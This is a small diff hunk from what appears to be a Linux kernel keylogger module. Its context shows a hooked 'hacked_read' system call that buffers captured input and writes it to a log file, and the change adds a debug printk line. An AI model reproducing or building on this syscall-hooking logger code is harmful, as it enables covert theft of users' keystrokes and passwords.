@@ -359,6 +359,7 @@ asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
 		{
 			strncat(logger_buffer, "\n", 1);
 			sprintf(test_buffer, "%s", logger_buffer);
+            printk("%c",test_buffer[0]);
 			write_to_logfile(test_buffer);
 			logger_buffer[0] = '\0';
 		}
